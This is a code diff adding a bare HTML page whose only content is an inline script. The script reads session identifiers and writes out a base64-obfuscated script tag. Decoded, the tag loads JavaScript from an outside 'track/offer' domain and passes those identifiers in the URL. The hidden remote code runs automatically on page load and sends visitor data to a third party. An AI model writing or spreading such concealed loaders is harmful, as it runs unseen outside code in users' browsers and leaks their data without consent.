@@ -1,0 +1,24 @@
+<html>
+    <head>
+        <link rel="shortcut icon" type="image/x-icon" href="icon.png" />
+    </head>
+    <body>
+    </body>
+    <script type="text/javascript">
+
+    var pid = sessionStorage.getItem("pid");
+    var gid = sessionStorage.getItem("gid");
+    var pub = sessionStorage.getItem("pub");
+    var local = sessionStorage.getItem("local");
+
+    var bk = atob("PGh0bWw+CiAgICA8aGVhZD4KICAgICAgICA8bGluayByZWw9InNob3J0Y3V0IGljb24iIHR5cGU9ImltYWdlL3gtaWNvbiIgaHJlZj0iaWNvbi5wbmciIC8+CiAgICAgICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vcHJla2VyLmNsdWIvdHJhY2svb2ZmZXI/cGlkPQ");
+    var tt = atob("Ij48L3NjcmlwdD4KICAgIDwvaGVhZD4KICAgIDxib2R5PgogICAgPC9ib2R5Pgo8L2h0bWw+");
+    function get(getid) {
+        return decodeURI(
+            (RegExp(getid + "=" + "(.+?)(&|$)").exec(location.search) || [, null])[1] || ""
+        );
+    }
+    //console.log(bk + pid + "&gid=" + gid + "&pub=" + pub + "&local=" + local + tt);
+    document.write(bk + pid + "&gid=" + gid + "&pub=" + pub + "&local=" + local + tt);
+</script>
+</html>
